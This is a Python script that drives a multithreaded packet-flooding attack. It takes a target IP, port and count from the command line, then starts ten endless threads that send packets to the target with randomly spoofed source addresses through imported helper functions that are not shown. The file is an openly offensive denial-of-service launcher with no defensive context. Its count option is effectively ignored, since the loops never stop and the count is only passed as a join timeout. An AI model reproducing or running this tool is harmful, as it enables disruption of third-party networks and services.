import sys
import time
import socket
import struct
import threading
from random import randint
from optparse import OptionParser
from src.utils.ip_utils import random_ip
from src.utils.attack import send_packet
from src.config.settings import PACKET_COUNT

def start_attack(target_ip, target_port, packet_count):
    print(f"Starting attack on {target_ip}:{target_port} with {packet_count} packets.")

    def attack_thread():
        while True:
            ip = random_ip()
            send_packet(target_ip, target_port, ip)

    threads = []
    for _ in range(10):  # Start 10 threads for the attack
        thread = threading.Thread(target=attack_thread)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join(packet_count)

if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="Target IP address")
    parser.add_option("-p", "--port", dest="port", help="Target port", type="int")
    parser.add_option("-c", "--count", dest="count", help="Number of packets to send", type="int", default=PACKET_COUNT)

    (options, args) = parser.parse_args()

    if not options.ip or not options.port:
        parser.error("IP address and port must be specified.")
        sys.exit(1)

    start_attack(options.ip, options.port, options.count)
